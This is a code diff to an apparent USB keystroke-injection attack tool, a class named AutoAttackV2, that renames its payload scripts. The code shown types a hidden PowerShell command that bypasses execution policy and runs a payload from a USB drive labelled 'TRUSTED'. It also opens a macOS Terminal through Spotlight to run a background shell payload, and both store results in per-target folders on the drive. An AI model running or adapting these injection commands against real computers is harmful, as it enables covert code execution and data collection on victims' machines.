@@ -1061,7 +1061,7 @@ class AutoAttackV2:
 
     def _inject_windows(self) -> None:
         """
-        Open PowerShell hidden and run windows_payload_v2.ps1.
+        Open PowerShell hidden and run windows_payload.ps1.
         Profile-aware: output goes to targets/PROFILE/ on USB.
         """
         assert self.kb is not None
@@ -1075,7 +1075,7 @@ class AutoAttackV2:
         cmd = (
             'powershell -W Hidden -Ep Bypass -NoP -C "'
             "$d=(Get-Volume|?{$_.FileSystemLabel -match 'TRUSTED'}).DriveLetter;"
-            f"if($d){{.\"${{d}}:\\windows_payload_v2.ps1\"-OutputPath \"${{d}}:\\targets\\{prof}\"}}"
+            f"if($d){{.\"${{d}}:\\windows_payload.ps1\"-OutputPath \"${{d}}:\\targets\\{prof}\"}}"
             '"'
         )
         logger.info("Windows injection: typing command (%d chars)", len(cmd))
@@ -1088,7 +1088,7 @@ class AutoAttackV2:
 
     def _inject_macos(self) -> None:
         """
-        Open Terminal via Spotlight and execute macos_payload_v2.sh.
+        Open Terminal via Spotlight and execute macos_payload.sh.
         Profile-aware: output goes to targets/PROFILE/ on USB.
         """
         assert self.kb is not None
@@ -1105,7 +1105,7 @@ class AutoAttackV2:
         cmd = (
             'v=$(ls -d /Volumes/TRUSTED* 2>/dev/null|head -1);'
             f'[ -n "$v" ]&&mkdir -p "$v/targets/{prof}"&&'
-            f'nohup bash "$v/macos_payload_v2.sh" -o "$v/targets/{prof}" '
+            f'nohup bash "$v/macos_payload.sh" -o "$v/targets/{prof}" '
             '>/dev/null 2>&1 &'
         )
         logger.info("macOS injection: typing command (%d chars)", len(cmd))
